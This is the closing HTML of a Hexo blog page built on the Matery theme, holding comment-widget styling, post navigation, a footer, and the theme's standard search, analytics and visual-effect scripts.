        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'U2qj9LBn7UhJFyVyb1bYDa9w-gzGzoHsz',
        appKey: 'Tg6wRvRlIfODtULeHu4P96zh',
        notify: 'true' === 'true',
        verify: 'false' === 'true',
        visitor: 'false' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'en',
        placeholder: 'just go go'
    });
</script>

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="/2023/03/07/json/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Json">
                        
                        <span class="card-title">Json</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            Json
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-07
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Program-design/" class="post-category">
                                    Program design
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Json/">
                        <span class="chip bg-color">Json</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/03/04/ml07/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="逻辑回归的代价函数简化版">
                        
                        <span class="card-title">逻辑回归的代价函数简化版</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            逻辑回归
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-04
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Academic/" class="post-category">
                                    Academic
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Academic/">
                        <span class="chip bg-color">Academic</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




                            <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2023-2024</span>
            
            <span id="year">2023</span>
            <a href="/about" target="_blank">Jf71o0x1o1l</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">247.9k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2023";
                    var startMonth = "2";
                    var startDate = "16";
                    var startHour = "24";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
            <span id="icp"><img src="/medias/icp.png" style="vertical-align: text-bottom;" />
                <a href="/null" target="_blank">津ICP备Jf710001011号</a>
            </span>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Jf710001011" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:lhhyp2333@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


                                <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

                                    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


                                        <script
                                            src="/libs/materialize/materialize.min.js"></script>
                                        <script
                                            src="/libs/masonry/masonry.pkgd.min.js"></script>
                                        <script
                                            src="/libs/aos/aos.js"></script>
                                        <script
                                            src="/libs/scrollprogress/scrollProgress.min.js"></script>
                                        <script
                                            src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
                                        <script
                                            src="/js/matery.js"></script>

                                        <!-- Baidu Analytics -->

<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

                                            <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

                                                
                                                    <script
                                                        src="/libs/others/clicklove.js"
                                                        async="async"></script>
                                                    
                                                        
                                                            <script async
                                                                src="/libs/others/busuanzi.pure.mini.js"></script>
                                                            

                                                                

                                                                        

                                                                                
                                                                                        
                                                                                            <script
                                                                                                type="text/javascript"
                                                                                                color="0,0,255"
                                                                                                pointColor="0,0,255"
                                                                                                opacity='0.7'
                                                                                                zIndex="-1"
                                                                                                count="99"
                                                                                                src="/libs/background/canvas-nest.js"></script>
                                                                                            

                                                                                                

                                                                                                            
                                                                                                                <script
                                                                                                                    type="text/javascript"
                                                                                                                    src="/libs/background/ribbon-dynamic.js"
                                                                                                                    async="async"></script>
                                                                                                                

                                                                                                                    
                                                                                                                        <script
                                                                                                                            src="/libs/instantpage/instantpage.js"
                                                                                                                            type="module"></script>
                                                                                                                        
                                                                                                                            <script
                                                                                                                                type="text/javascript">
                                                                                                                                    //只在桌面版网页启用特效
                                                                                                                                    var windowWidth = $(window).width();
                                                                                                                                    if (windowWidth > 768) {
                                                                                                                                        document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
                                                                                                                                    }
                                                                                                                                </script>
                </body>

</html>